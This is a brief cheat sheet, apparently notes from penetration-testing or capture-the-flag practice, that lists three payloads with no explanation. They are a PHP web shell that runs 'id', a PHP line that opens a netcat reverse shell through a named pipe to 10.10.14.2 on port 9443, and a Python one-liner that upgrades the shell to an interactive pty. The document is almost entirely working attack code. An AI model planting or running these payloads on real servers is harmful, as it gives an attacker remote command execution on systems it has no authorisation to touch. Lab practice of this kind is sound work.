##Basic command code
```
<?php system('id'); ?>
```
##Bash reverse shell one-liner for PHP script
```
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 9443 >/tmp/f"); ?>
```
##stable shell python
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

